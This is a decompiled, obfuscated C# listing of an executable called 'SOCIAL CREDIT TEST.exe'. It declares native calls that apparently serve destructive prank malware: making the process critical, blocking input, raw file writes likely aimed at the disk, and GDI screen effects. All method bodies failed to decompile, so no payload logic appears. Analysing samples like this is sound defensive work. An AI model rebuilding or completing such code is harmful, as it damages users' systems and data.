// Decompiled with JetBrains decompiler
// Type: ‫‏‭‪‮⁫‫⁮⁬‫‪‍‮‫​‪⁯​‍‏‫‫‬‍⁪‪⁪‭⁬‏‍‎‎⁫‌‮‍‌‏‬‮
// Assembly: SOCIAL CREDIT TEST, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A9FFD1C6-DD6B-47BE-B937-02E8EB54F42C
// Assembly location: C:\Users\adriel\Downloads\SOCIAL CREDIT TEST.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

#nullable disable
public class \u202B‏‭‪‮⁫‫⁮⁬‫‪‍‮‫​‪⁯​‍‏‫‫‬‍⁪‪⁪‭⁬‏‍‎‎⁫‌‮‍‌‏‬‮
{
  private const int \u202B‎⁯‍‌‌⁭⁭⁬‮⁮‪‬‪⁭⁮‏⁬‮‎‫‮‬⁭‫‬‌⁯‮⁮⁮⁫‫⁪‌‌‫​‬⁮‮ = 0;
  private const int \u206F‭‏‌‪‭‪‫⁭⁫‪⁮⁪‎⁯⁫​‫‍⁬‬‎‏⁯⁯⁬‬‏‭‏⁮‍​⁮⁬‪⁬⁮⁯‎‮ = 1;
  private static SoundPlayer \u200D⁯⁮‌⁫‫​‪‪⁫‍​‎‏‏‍⁮‫⁬‏⁫‪‍‮‪‍​⁭‫‌⁮‭‪​‍‭​‎‭⁭‮;
  private static SoundPlayer \u202A‌⁯‪⁪‭⁯‪⁪‬⁭⁫‏‏​‏​‌⁯​‎⁬‎‍‮‪⁮⁬⁯⁪‭⁮⁮‍⁭‮‪‫‪‏‮;
  private static SoundPlayer \u202D‫⁭‮‬⁭‍‪​⁯‌⁯‫‬⁬⁯⁫​‬⁫⁬⁪‫⁫‬‬‍⁬‬⁮⁯‏‬‪‍⁭​‍⁫‬‮;
  private const uint \u206E‎‌⁪‫⁭⁮‮‮‎‫⁮‏‫‭​‌‎‮‏⁫⁪‫⁮‍‪‪‎‌⁬‮⁫‬‮⁪⁪‍⁫⁭‌‮ = 2147483648 /*0x80000000*/;
  private const uint \u206E‌⁯​‎⁪⁮⁫‬‌‎⁪​⁯‍‭‎‪‫‎⁯‍‍‌⁯⁭⁯⁬‌⁬​‫⁬​⁯‍‭⁬⁮‎‮ = 1073741824 /*0x40000000*/;
  private const uint \u200D‌‪⁭⁬‭‏‪‎‪‮⁮⁭⁬‍⁭‬‫‪⁯‪⁮‮‍⁪‎​‬‭⁬⁬‬⁮‎‭​‫⁫⁯‌‮ = 536870912 /*0x20000000*/;
  private const uint \u206E​‪‬‏‪‫‏‫‭‭‭⁮⁮‫⁪‏​⁫⁮‎⁫‏‫⁬‏‌⁯⁯‪⁬‭⁫‪​‮‬‮‮‫‮ = 268435456 /*0x10000000*/;
  private const uint \u200D‏​⁬⁭‪⁭​‍‎⁯⁮⁭⁭‫‪⁪⁬​⁪‫⁬⁯‪‏⁪⁯‪⁭⁮‭​‏‫⁭⁯‬‬⁫⁮‮ = 1;
  private const uint \u202E‍‌⁭⁭‮‎‎‌⁯⁫‬⁭⁪⁫⁪‌‪⁮‫‎⁫‭​‫‍⁪‌‪⁯⁮⁬⁮‍⁮‭⁪⁫⁮‮‮ = 2;
  private const uint \u206B‍⁫‪⁮⁬‪​⁯‫‏⁮‍‪‭‪‮⁫‎‫⁭⁮‌⁮⁬‪​‭⁬⁮‏‍⁭‍‪⁬⁯⁯‪‍‮ = 3;
  private const uint \u200F⁫‮‭‭‫‬⁬‪‏⁪⁮‪⁫‬‏⁮​⁬‍‫‍⁬‪‫‏‍‌‍‮⁬⁯‌⁮⁯⁬⁭‬⁬⁪‮ = 67108864 /*0x04000000*/;
  private const uint \u200C⁪‪⁪‎​⁮‭⁭‭‭⁪‫⁪‮⁪⁫⁪⁮⁯‏⁯‏‍‮⁮⁬‮⁯⁫‮‬‮⁪‌⁪​‭⁫‎‮ = 512 /*0x0200*/;
  private Random \u206B‭⁫‬⁫‫‬⁫​⁯‬⁯⁫‬⁮⁭‮‎‪⁫⁫⁬‪‫⁬‭‌‬‏‍⁯‪⁪‬‍‭⁪‏⁯‬‮;
  public bool \u202B‎‫⁫‎‍‎‏‪⁫‪⁮⁪‎⁭‏‬‏‫‮‬⁪⁪‍​‪⁪​‬‪‍​​⁭‬‌⁫⁬‪⁯‮;
  public bool \u202E⁫‎‌‫⁫⁪⁮‬⁫‍‎‭⁯‍‍⁭‬‪⁪⁬‬‮‫⁪‎‪​⁯‪⁫⁫‪‌‬‫⁭‍‏⁫‮;
  public bool \u206E⁪‭‭‭‌‍​‏⁫⁫‌⁬‬‍⁫‬‫‪⁪‭‮⁪‫‍⁪‫⁫‭‫‌‮⁭⁮‫⁭‮‬⁫‬‮;
  private int \u206C‮‏⁯‪​‪‏⁫⁮‭‫‬‏‪‌⁫‭​⁬‫⁪‍​‪‭‫‪‬‫⁭⁫⁫‎⁮⁭⁪⁪‍‫‮;
  private int \u206A‫⁮⁬⁫‌‍⁫⁪‮‭⁭‭⁬‫‬⁬​‌‪‮⁯‌‫‍‎⁪‪‫‪‬⁫​‎‬‎​⁯‍‮‮;
  private int \u206A⁫‬‎⁭‏‌⁭‭⁫‌‫‏‫​‏‎⁯‭‬‎‫‌‪‭⁮⁭‌‏⁭‌⁬⁬‮⁪⁬‏‌‎‍‮;
  private int \u202C‭‎‪‬‬‫‌‫‫‏‭⁪‎⁮‫⁫‭⁪⁬‪⁮‏⁪‪⁫‎​⁯‮⁭⁮‮⁬⁬⁫⁯‮​⁪‮;
  private bool \u202B⁪‫⁪‮‫‍‎‏‍‭‬⁫‌‭‪‭⁯⁮‭‪⁯‫‬⁫‪⁪‍‏⁯⁮‮‫‍⁯⁭‬‮‬⁭‮;
  private bool \u202C‎‎‍​⁫‌⁫‮‎⁫‬‭‮‮⁯‎‍‬⁭‪⁯⁯⁬‭‏‎‎⁫​⁬‍⁭‌‏‬‌⁪⁭⁯‮;
  private uint[] \u200F​‮‬‪‮⁯⁯​‭‌⁬‫‬‮⁬​⁪⁭⁭⁭⁮‮‬‍‬‍​⁬​‍⁫⁭‎‎⁮‏⁮⁪‮‮;
  private ushort[] \u206C⁪‬⁪‍‎‮⁭​⁮⁯‍⁯⁬‎⁪⁭⁬‏‫‪⁫‪⁯‏‬‌⁮‫⁪‭⁮‏⁬‌‍‬⁮⁯⁬‮;
  private int \u206C‭‏⁯‭‌‫‪⁮‪⁯⁫‫‮⁮​⁬⁮​‎‬⁪‭⁭⁭⁭‎‎​‌⁯‎‎‪⁪‪⁫‪‮‍‮;
  private int \u200B‫‮‪​‫⁭‭⁮⁫‏‮‭‪‏‍⁭‎​‌⁭⁭⁪⁫⁯⁮‫​‪‌⁬⁮‎‫‏‎‮⁬⁪‮‮;
  private int \u202B‎‏‌‫⁫‭⁯‎‎‍⁯‫‫‌‭​‌‎⁫‬‪⁬‬‍⁯‬⁬‫⁪⁫‍⁪​​⁪⁫‬⁫⁮‮;
  private int \u200D‬‫⁮⁮‎​‍⁮​⁮‎‌‬‎‌‌⁪‫‪‎‬‬⁭‍‭‪‪‬⁮​‎⁮​⁬‪⁪‌‭⁯‮;
  private int \u206A​⁭‌‎‭‮⁪‌‪‎‪‎⁭‍‭‮‌‬⁫⁭⁪‮⁯‏‮‍⁪‭⁮⁬⁭⁬‫‭⁪‫‍‭‮‮;
  private string[] \u202B‪⁫‬‬‭‪⁭⁭‪⁫‪​⁭‎‏⁫⁮‫⁫‬‭⁭‏‬⁫⁮⁫‮‭‫‏‮​⁯⁮‭‭​‌‮;
  private string[] \u202C‪⁭⁯⁯⁫‪‎‏⁯⁯‮‌‫⁯⁭⁯‎‌⁬‭‪‭‭‬⁮⁮⁮‍‫⁫‪⁪‮⁯​⁪‫‍‏‮;
  private string \u202E‪⁪‏‫​⁬‎‫​⁫⁪‫‮‌⁮⁭‎⁭‏‍‍‌‪‫‌‍​‌⁯⁭​⁪⁫‎‮‬⁫‫⁮‮;
  private \u202B‏‭‪‮⁫‫⁮⁬‫‪‍‮‫​‪⁯​‍‏‫‫‬‍⁪‪⁪‭⁬‏‍‎‎⁫‌‮‍‌‏‬‮.\u206B‫⁯⁯⁭‪⁫‪‫‎⁫‎⁭‭⁪⁪‭⁭⁪‭⁮⁯⁭⁪‏⁬⁬‫⁫‫⁯​⁭⁮‍​⁯‮‮‍‮[] \u200F‎​⁮‏⁬⁪‫‌‭⁫⁬‎​‏‍‫‪‎​‬⁪‏‭‭‍‌‪‎‮‏‭⁪⁫‬‫‏⁮‬‬‮;

  [DllImport("ntdll.dll", EntryPoint = "NtSetInformationProcess", SetLastError = true)]
  private static extern int \u200C‭‍‮⁯‬‭‬⁭‪‭⁪‎‎‌‏​‬‪⁮⁮‭‭‬⁫‪​‬‏‏⁫‏‏⁯​⁫‎⁮‭‭‮(
    IntPtr _param0,
    int _param1,
    ref int _param2,
    int _param3);

  [DllImport("gdi32.dll", EntryPoint = "CreatePen")]
  private static extern IntPtr \u206F⁭⁫⁯‪‏‌⁯‍⁪‪⁮⁯⁬⁭⁪‬⁯‭‍⁪‬‭⁭‫⁬‌⁮⁪‌⁬‮‪‌‍⁫​⁭‍‏‮(
    \u202B‏‭‪‮⁫‫⁮⁬‫‪‍‮‫​‪⁯​‍‏‫‫‬‍⁪‪⁪‭⁬‏‍‎‎⁫‌‮‍‌‏‬‮.\u206E‬‌‪​⁭⁮⁬‌⁯‎‪‮⁯⁯⁭⁬⁬‫⁯⁬‭⁫‭‍‎⁭⁮‮‌‎‌⁭‍​​‎‏⁭⁯‮ _param0,
    int _param1,
    uint _param2);

  [DllImport("user32.dll", EntryPoint = "GetDC", SetLastError = true)]
  private static extern IntPtr \u202C‍⁪‫‫⁭⁫‪‫‌‍‎‫⁮⁪⁬​‫⁫‮‍‌⁮‫‎‍​‬‎​‭‮⁫⁪⁮⁪​‪⁮⁭‮(IntPtr _param0);

  [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleDC", SetLastError = true)]
  private static extern IntPtr \u202E⁯‪⁬⁬​⁪‮‭‍‏‏‮‎⁮⁫⁫⁭‭‮‌‮​‪‌⁪⁪‏‮‏⁭‌‎‬⁫​⁪⁭⁮‌‮(IntPtr _param0);

  [DllImport("gdi32.dll", EntryPoint = "SelectObject")]
  public static extern IntPtr \u200D⁫‬​⁬‫‎‪‮‎⁯⁫​​‮‭‎⁪⁫‪⁭‏⁯‮‌⁭‬‌​⁫⁮⁫‬⁭⁭‮‪⁪⁫‮‮(
    IntPtr _param0,
    IntPtr _param1);

  [DllImport("gdi32.dll", EntryPoint = "MoveToEx")]
  private static extern bool \u206F‪⁭⁬⁬⁫⁬⁫‫⁮⁮‬‎‫‍‪⁬⁭⁮‪‌⁫‌‏‭‭‬‮⁪‮​‎‎‏‫‭‭‮⁫⁮‮(
    IntPtr _param0,
    int _param1,
    int _param2,
    IntPtr _param3);

  [DllImport("gdi32.dll", EntryPoint = "MaskBlt", SetLastError = true)]
  private static extern bool \u200D​‭​‮‍‫⁫​‮⁫⁯‫⁬‮‏‪‭‌‎​⁮‬‌‭‬⁬‫‌‬‌‭‭‪​‍⁬⁪⁫‭‮(
    IntPtr _param0,
    int _param1,
    int _param2,
    int _param3,
    int _param4,
    IntPtr _param5,
    int _param6,
    int _param7,
    IntPtr _param8,
    int _param9,
    int _param10,
    uint _param11);

  [DllImport("gdi32.dll", EntryPoint = "LineTo")]
  private static extern bool \u206F‫​⁪⁭⁭⁫‏⁫⁬‮​‏‍⁪‍‌‬‪‬⁯‬‫‬⁯‬⁫⁭⁭‏⁫⁮​⁪⁮⁪⁬⁪‌‮(
    IntPtr _param0,
    int _param1,
    int _param2);

  [DllImport("gdi32.dll", EntryPoint = "DeleteObject")]
  [return: MarshalAs(UnmanagedType.Bool)]
  public static extern bool \u202E‪⁯⁭⁮⁬‫⁪⁬‍​⁯‭​⁮‪‭⁬‮‬⁬⁫⁬‭‮‏‪‭‍⁮‬‫‪‌⁬‎⁬‌⁭‮‮(IntPtr _param0);

  [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
  [return: MarshalAs(UnmanagedType.Bool)]
  private static extern bool \u202D‏‮‬⁪⁯​‌‪‭⁬‮‬​⁯‎⁯⁯‮⁫⁯‍⁫​‎⁪⁬‌​​⁯‭⁪⁮‌‫⁮‎⁭⁭‮(
    IntPtr _param0,
    int _param1,
    int _param2,
    int _param3,
    int _param4,
    IntPtr _param5,
    int _param6,
    int _param7,
    \u202B‏‭‪‮⁫‫⁮⁬‫‪‍‮‫​‪⁯​‍‏‫‫‬‍⁪‪⁪‭⁬‏‍‎‎⁫‌‮‍‌‏‬‮.\u202D‍‌⁮‮‫‫‏‪⁭‬⁫⁬‫‎⁯‮‭‍‬⁮‫⁯‬⁯‏‪⁪‬‫⁯⁪‫⁯‭‬‭⁬⁯‬‮ _param8);

  [DllImport("gdi32.dll", EntryPoint = "StretchBlt")]
  private static extern bool \u206E‬‌‪⁪‪‏⁯⁫​‌‫‮‮‫‪‮⁪⁭⁯⁪⁯‬‏‌‬‫⁪‌‮​​⁭‮‌​‮‎⁬‌‮(
    IntPtr _param0,
    int _param1,
    int _param2,
    int _param3,
    int _param4,
    IntPtr _param5,
    int _param6,
    int _param7,
    int _param8,
    int _param9,
    \u202B‏‭‪‮⁫‫⁮⁬‫‪‍‮‫​‪⁯​‍‏‫‫‬‍⁪‪⁪‭⁬‏‍‎‎⁫‌‮‍‌‏‬‮.\u202D‍‌⁮‮‫‫‏‪⁭‬⁫⁬‫‎⁯‮‭‍‬⁮‫⁯‬⁯‏‪⁪‬‫⁯⁪‫⁯‭‬‭⁬⁯‬‮ _param10);

  [DllImport("gdi32.dll", EntryPoint = "PlgBlt")]
  private static extern bool \u206E⁮⁯⁫​‍⁬⁫‏⁬‪⁬‬‪⁭‎⁮‏⁪​⁪​⁫‭​‎‬⁮⁭‫​‬‎‎‬‏‌⁫⁬‮‮(
    IntPtr _param0,
    \u202B‏‭‪‮⁫‫⁮⁬‫‪‍‮‫​‪⁯​‍‏‫‫‬‍⁪‪⁪‭⁬‏‍‎‎⁫‌‮‍‌‏‬‮.\u206B‫⁯⁯⁭‪⁫‪‫‎⁫‎⁭‭⁪⁪‭⁭⁪‭⁮⁯⁭⁪‏⁬⁬‫⁫‫⁯​⁭⁮‍​⁯‮‮‍‮[] _param1,
    IntPtr _param2,
    int _param3,
    int _param4,
    int _param5,
    int _param6,
    IntPtr _param7,
    int _param8,
    int _param9);

  [DllImport("gdi32.dll", EntryPoint = "PatBlt")]
  private static extern bool \u200B⁭⁬⁭‬‏‏​​‬⁮⁭⁫‎‍⁭‫‪‪⁮⁮‎‬​​⁬‎​‮‮⁪⁮‪‏‌⁫‮⁫​‌‮(
    IntPtr _param0,
    int _param1,
    int _param2,
    int _param3,
    int _param4,
    \u202B‏‭‪‮⁫‫⁮⁬‫‪‍‮‫​‪⁯​‍‏‫‫‬‍⁪‪⁪‭⁬‏‍‎‎⁫‌‮‍‌‏‬‮.\u202D‍‌⁮‮‫‫‏‪⁭‬⁫⁬‫‎⁯‮‭‍‬⁮‫⁯‬⁯‏‪⁪‬‫⁯⁪‫⁯‭‬‭⁬⁯‬‮ _param5);

  [DllImport("gdi32.dll", EntryPoint = "Ellipse", SetLastError = true)]
  private static extern bool \u206C⁬‎⁭‮⁭‭‬‌⁯‬‭⁭‏⁬‪‭⁪‬‫‫⁯‪​‍‬‫‭‏⁪⁬‌‬⁬⁪‮⁫‫‌⁫‮(
    IntPtr _param0,
    int _param1,
    int _param2,
    int _param3,
    int _param4);

  [DllImport("gdi32.dll", EntryPoint = "GdiAlphaBlend")]
  public static extern bool \u206A‭‭‬‪⁯​‮⁬⁮⁬⁪​‮⁮‮‭⁪‏⁯‏‪⁪‏‪⁭‫‌‫‏‪‬⁪‫‫‎‎‏⁮‫‮(
    IntPtr _param0,
    int _param1,
    int _param2,
    int _param3,
    int _param4,
    IntPtr _param5,
    int _param6,
    int _param7,
    int _param8,
    int _param9,
    \u202B‏‭‪‮⁫‫⁮⁬‫‪‍‮‫​‪⁯​‍‏‫‫‬‍⁪‪⁪‭⁬‏‍‎‎⁫‌‮‍‌‏‬‮.\u200D⁯​​‍⁪⁭‮‮⁬⁯‎⁮‍‭‎‌‌‪⁬‍‫‪⁭⁫‍⁬‌‍‫⁬⁬‏‬⁬‫‍‬⁬⁫‮ _param10);

  [DllImport("gdi32.dll", EntryPoint = "CreateSolidBrush")]
  private static extern IntPtr \u200D⁯‭⁫‍⁫‍‎‏⁫‏‍‮‏‎‏‪⁯​⁫⁭⁬‫⁫‍‏⁭​‍‫‬⁭‮⁫⁯‭‫‮⁬‌‮(uint _param0);

  [DllImport("gdi32.dll", EntryPoint = "CreateBitmap")]
  private static extern IntPtr \u200F‪​⁯‪‪⁯⁫‍​⁫⁫⁫‬‪‫‪⁭‫‮‬‏‮⁮‬⁯‪‏⁬‎⁬‬⁫⁭⁬‍⁪‎⁬‏‮(
    int _param0,
    int _param1,
    uint _param2,
    uint _param3,
    IntPtr _param4);

  [DllImport("gdi32.dll", EntryPoint = "DeleteDC")]
  public static extern bool \u202E⁭⁮‪‭‎⁯‮‫‎‍‎⁮⁫‫‪⁯‌⁭⁭‍⁭⁮⁯⁮‍‪‌⁪​‬​‎​‪‪⁪‌⁯‌‮(IntPtr _param0);

  [DllImport("gdi32.dll", EntryPoint = "FloodFill")]
  private static extern bool \u200C⁬‫⁭⁭‎‏⁬‮⁬⁮⁬‍​⁫⁮‍⁯‫⁬‎‮⁭⁪‌‭⁯⁯⁪‭⁪‌⁭‍⁯‎​⁫⁪‮‮(
    IntPtr _param0,
    int _param1,
    int _param2,
    uint _param3);

  [DllImport("gdi32.dll", EntryPoint = "GdiGradientFill")]
  public static extern bool \u200D‌‏‌⁪⁭‬‌⁬⁫‍⁪‬‮‎⁬‭⁯‮‪⁮⁭⁭​‍⁮⁮⁬‫‬⁫‌⁫⁬⁯‍‪⁯⁪⁭‮(
    IntPtr _param0,
    \u202B‏‭‪‮⁫‫⁮⁬‫‪‍‮‫​‪⁯​‍‏‫‫‬‍⁪‪⁪‭⁬‏‍‎‎⁫‌‮‍‌‏‬‮.\u200C‭‭‬⁫⁬‏‫⁬​​‪​‏‏‪⁬‏⁭​‭‮‮​‮‭⁪⁬‬⁫‎⁮⁯​‎‭‍​‍‏‮[] _param1,
    uint _param2,
    \u202B‏‭‪‮⁫‫⁮⁬‫‪‍‮‫​‪⁯​‍‏‫‫‬‍⁪‪⁪‭⁬‏‍‎‎⁫‌‮‍‌‏‬‮.\u202A⁬⁪⁫‬‮⁭‍​⁪‍‮⁫‬‍‏‭‪⁯‬‬‎‬‫⁪⁮‫‎⁪‭⁮‬⁯⁮‮‌⁫‬‫⁮‮[] _param3,
    uint _param4,
    \u202B‏‭‪‮⁫‫⁮⁬‫‪‍‮‫​‪⁯​‍‏‫‫‬‍⁪‪⁪‭⁬‏‍‎‎⁫‌‮‍‌‏‬‮.\u206C‮‏‍​‪⁬⁫⁮‭⁮‏⁮‫‬​‌‫‭‎⁪‪‌⁫⁯‏‭‍⁯⁮‎‏‍⁭‎‌⁮‌⁪‎‮ _param5);

  [DllImport("user32.dll", EntryPoint = "GetDesktopWindow")]
  private static extern IntPtr \u206C⁭⁪‭⁮⁪‮​⁪‎‬⁮⁮⁭‬‪⁭‫‫‮⁪⁭‫‪⁬⁫‫‍‭‎‪⁫​‎⁭‭⁭​‬⁯‮();

  [DllImport("user32.dll", EntryPoint = "GetWindowDC")]
  private static extern IntPtr \u202B⁪‪​‮‏⁪‬⁭⁫‬‏⁬⁯⁬⁮⁬​‌⁭⁯⁮​‭⁬‍⁭⁯‭​‫⁯⁭‏‪‏⁭⁪​‎‮(IntPtr _param0);

  [DllImport("user32.dll", EntryPoint = "InvalidateRect")]
  private static extern bool \u200C⁬‫‌​‬‫‍⁮‬⁭⁯‬⁪‎⁪‎‪‍‪‏‬⁮⁭⁪⁭‏‫‬⁮‭⁬‭⁯‌‮⁮⁪⁯‎‮(
    IntPtr _param0,
    IntPtr _param1,
    bool _param2);

  [DllImport("User32.dll", EntryPoint = "ReleaseDC")]
  private static extern int \u206B⁭⁫‍⁬‬⁮‫‏⁪‬‪‭​⁭⁮‌⁪‌​⁭⁪⁮‌‭⁮⁪‭‏‍⁫‭⁮⁮⁯‏‎‮⁭‮(
    IntPtr _param0,
    IntPtr _param1);

  [DllImport("gdi32.dll", EntryPoint = "FillRgn")]
  private static extern bool \u206A‌‌⁫⁫⁫‬‏‍‏⁭‭‎⁫‭‭‭‫‫⁯‌‍⁮⁮​⁬⁮‭‮​‏‮‎‏‫⁯⁪‫‫‬‮(
    IntPtr _param0,
    IntPtr _param1,
    IntPtr _param2);

  [DllImport("gdi32.dll", EntryPoint = "CreateRectRgn")]
  private static extern IntPtr \u206D‫‌‪⁪⁫‌⁬‎‍‬‬⁮⁮‭⁫‏‬⁪‪​⁭‌‮‭‍⁪‭⁪‭‌⁪⁬‮‌‫⁯‬⁪‏‮(
    int _param0,
    int _param1,
    int _param2,
    int _param3);

  [DllImport("gdi32.dll", EntryPoint = "Pie")]
  private static extern bool \u200F‪‪⁪⁪⁬‫‍‬⁮⁭‍‮⁮‪‭⁭‌⁯‭‮‫‫⁬⁬‪⁪‎⁯‌‌⁪⁫‎‎⁪⁪‮‬⁪‮(
    IntPtr _param0,
    int _param1,
    int _param2,
    int _param3,
    int _param4,
    int _param5,
    int _param6,
    int _param7,
    int _param8);

  [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleBitmap")]
  private static extern IntPtr \u202D‭‎‍⁪‮⁭‭​‭‍‏⁮⁬‏⁬⁭‮​‪⁮⁬‮‬‏‌‍​⁫​‮‬‮⁫‭‫⁮⁬‌⁬‮(
    IntPtr _param0,
    int _param1,
    int _param2);

  [DllImport("gdi32.dll", EntryPoint = "Rectangle")]
  private static extern bool \u200F‌‬‬‌​⁬⁬‍⁬‮⁫⁭⁫‭⁭⁬‏⁮‪​‪⁯​‫‬⁯‍‮‪‎‍‫‌⁮‎‌‌​⁯‮(
    IntPtr _param0,
    int _param1,
    int _param2,
    int _param3,
    int _param4);

  [DllImport("gdi32.dll", EntryPoint = "SetPixel")]
  private static extern uint \u202D⁫‍‪⁯⁫​‎‍‍‍⁫‏​⁮⁭⁮‮⁬⁯‎⁯‫⁪‭‮⁬‭‍‭⁮⁫⁮​‏‌‍‎‮‬‮(
    IntPtr _param0,
    int _param1,
    int _param2,
    int _param3);

  [DllImport("gdi32.dll", EntryPoint = "GetPixel")]
  private static extern uint \u202A‎‎‫‮⁪⁬‪‌⁯⁪‌‌‮‭⁭‭‬‏‫‮⁫⁪‪⁭‫‎⁫‫‌⁯‍​‏⁭‬‍‍‫‬‮(
    IntPtr _param0,
    int _param1,
    int _param2);

  [DllImport("gdi32.dll", EntryPoint = "AngleArc")]
  private static extern bool \u206E‌‬⁫⁮‪‭‫‭‮‌‫‮‭‏​⁫‬⁮‮‌‏⁪⁮⁪⁫‬‏⁭⁪⁭​⁫⁮⁯⁯‌‮‏‭‮(
    IntPtr _param0,
    int _param1,
    int _param2,
    uint _param3,
    float _param4,
    float _param5);

  [DllImport("gdi32.dll", EntryPoint = "RoundRect")]
  private static extern bool \u200B⁭⁭⁫⁯⁫‭‎⁬‭‌‮‌‎​‪⁬​‭‬‫⁪⁭‭‎‫‭⁭⁭⁪⁮⁮‍​‮‏⁮⁫⁮⁯‮(
    IntPtr _param0,
    int _param1,
    int _param2,
    int _param3,
    int _param4,
    int _param5,
    int _param6);

  [DllImport("gdi32.dll", EntryPoint = "DeleteMetaFile")]
  private static extern bool \u206E‫‪‮⁮‎⁪⁬‫⁫⁯‬‏‏‫⁫​‭‌⁪⁪‪‮‮‍​​‮‫​‪​‬⁪⁯‏⁮⁬⁯⁭‮(IntPtr _param0);

  [DllImport("gdi32.dll", EntryPoint = "CancelDC")]
  private static extern bool \u200E‌‬‌⁯⁭‍‬‪‍‫⁮‮‌‭⁬‌‍‎⁬‬⁭⁮‬‮‪‮‎‭‍‪‌‎‮⁮​⁬‮‮⁫‮(IntPtr _param0);

  [DllImport("gdi32.dll", EntryPoint = "Polygon")]
  private static extern bool \u206A‏‎‪‌‫⁫‌⁮‌⁯⁬⁪⁪⁬⁬‭‌⁮‭⁬​⁬‭‎​⁬‎⁯⁪‎‍​⁯‌‭⁯⁬‏⁫‮(
    IntPtr _param0,
    \u202B‏‭‪‮⁫‫⁮⁬‫‪‍‮‫​‪⁯​‍‏‫‫‬‍⁪‪⁪‭⁬‏‍‎‎⁫‌‮‍‌‏‬‮.\u206B‫⁯⁯⁭‪⁫‪‫‎⁫‎⁭‭⁪⁪‭⁭⁪‭⁮⁯⁭⁪‏⁬⁬‫⁫‫⁯​⁭⁮‍​⁯‮‮‍‮[] _param1,
    int _param2);

  [DllImport("gdi32.dll", EntryPoint = "SetBitmapBits")]
  private static extern int \u202A‌⁪‏​‮‭‍‍‫⁭⁫‪‭‪⁪⁫⁫⁬⁯‮⁫‮‭⁫​‪‮‬⁪‬‮‎‭⁫‫​⁬‮⁫‮(
    IntPtr _param0,
    uint _param1,
    byte[] _param2);

  [DllImport("kernel32.dll", EntryPoint = "Beep", SetLastError = true)]
  private static extern bool \u206F‎⁯‪⁪‎‮​‌‌⁫‪‌⁫‌⁬‫⁬‎⁫‎⁯‪‭⁪⁭⁬⁭‫⁮‮⁯⁫‮​‏‮⁯⁮‍‮(
    uint _param0,
    uint _param1);

  [DllImport("user32.dll", EntryPoint = "BlockInput", SetLastError = true)]
  public static extern bool \u202B⁮‪‫‬‬‏⁫‎‫‭‫⁭⁭‍‪⁭‌⁪‮‎​⁫‎​‬‍⁭​⁪‌‍⁯⁭⁪⁮⁬‪‎‎‮(bool _param0);

  [DllImport("kernel32", EntryPoint = "CreateFile")]
  private static extern IntPtr \u206C​‮⁫‭‪⁮⁬⁭‎⁪⁬⁭‫‫​‌⁬‪‫⁫‫‮‌‌⁯⁭‏⁮‎‫‫‏​‪⁪‎⁯⁭⁫‮(
    string _param0,
    uint _param1,
    uint _param2,
    IntPtr _param3,
    uint _param4,
    uint _param5,
    IntPtr _param6);

  [DllImport("kernel32", EntryPoint = "WriteFile")]
  private static extern bool \u200D‮‍⁬‮​‫‫⁫⁬‍⁯‬‬‪‌‪‭‏⁬‬‎‎‪‪‎‭⁫‍‪⁭‮‭⁭⁪⁮‍⁭⁯⁪‮(
    IntPtr _param0,
    byte[] _param1,
    uint _param2,
    out uint _param3,
    IntPtr _param4);

  [DllImport("kernel32.dll", EntryPoint = "CloseHandle", SetLastError = true)]
  private static extern bool \u206B‬⁪‬‌⁫‌⁪⁪⁬‎‍​‬⁮‌⁪‭‍⁫‎‌⁫‍⁮‬⁭⁮⁭‎‏⁯‎‌‏​‏⁯‌‏‮(IntPtr _param0);

  public void \u202C‌⁭‌‏⁮​‍‍‏⁭⁯‭⁯‮⁯⁪‮‭⁫⁫‮⁮‏​‎‮⁮⁬‫⁭‍‎⁯‌⁬‭⁬‫⁭‮()
  {
    // ISSUE: unable to decompile the method.
  }

  public void \u206A‮‎⁪‏‌‏⁯‬⁪⁫⁪⁫‬⁮⁯‬‬‮‫⁭​‍‪​‫⁬​⁭⁮‌⁫⁫‫‮⁮‫‍⁮‏‮()
  {
    // ISSUE: unable to decompile the method.
  }

  public void \u200B⁬​⁫‌‎‏‮‫‌⁯⁪⁫⁬⁪‫⁭⁫‍‍‭‍⁬‫‮‎‪⁪⁪‪⁪‌​⁯‬‌⁯‎​‎‮()
  {
    // ISSUE: unable to decompile the method.
  }

  public void \u200B‎‏⁫⁬⁬‌‫‌⁯⁮‬⁬‪‪⁪‍‏⁯⁭‫‬‌‫⁯⁭‬‪⁭‫‍‌⁮‮‪‍‍‬​⁭‮()
  {
    // ISSUE: unable to decompile the method.
  }

  public void \u200D‪⁪‮‬⁭‫⁪‍⁯‪⁯‪‮‭‫‫‪⁪‮⁭‭⁪⁫‫⁪‍⁮‪‫⁪​⁯‏‎⁮‍‬⁫⁮‮()
  {
    // ISSUE: unable to decompile the method.
  }

  public void \u206B‭‫‫⁮‍‫⁯‪⁭⁮‎⁮​‌⁬‫⁫‭‎‫​⁭⁯‌⁫‫⁭⁮⁫‮‏‎‭‪⁬‎‬‮‏‮()
  {
    // ISSUE: unable to decompile the method.
  }

  public void \u206A⁮⁬‏​⁪‬‎‍⁮⁪⁭‍‭​⁭⁫‭‍⁫‮‫⁮⁭‫‬‌‌⁬‎‬⁮⁭‪‏‪‮‭‌‪‮()
  {
    // ISSUE: unable to decompile the method.
  }

  public void \u206F​⁭‏‌​⁪‍‭⁬‏‬‫‫‮‭⁫⁪⁫‫⁯⁫‍‭‍⁮‮‏‌⁫‌‮‬‮‫⁬⁭‬⁪‫‮()
  {
    // ISSUE: unable to decompile the method.
  }

  public void \u206A​‌‍⁫‭‍‏‬‭⁬‭‏‌‌‬‮‭⁪⁭⁭‏⁬‏⁪‍⁭⁭⁪‎⁭⁭‬‍⁬‎⁭‌​‏‮()
  {
    // ISSUE: unable to decompile the method.
  }

  public void \u206C‎‎‪⁭⁫⁫‪⁬‮⁮⁭‮⁭‮‌⁫⁯⁪​‮‫⁫‪​⁯⁭⁭​⁪‍‬⁪‎⁫⁪‎⁮‮‭‮()
  {
    // ISSUE: unable to decompile the method.
  }

  public void \u200E‎‏‭‮⁬‮‌⁫⁮‮‮​⁯‍‫⁪‬‪‬​‫‌⁮‮‌‮‏‪⁪‌‮‏‏‭⁯⁫‬‎‮‮()
  {
    // ISSUE: unable to decompile the method.
  }

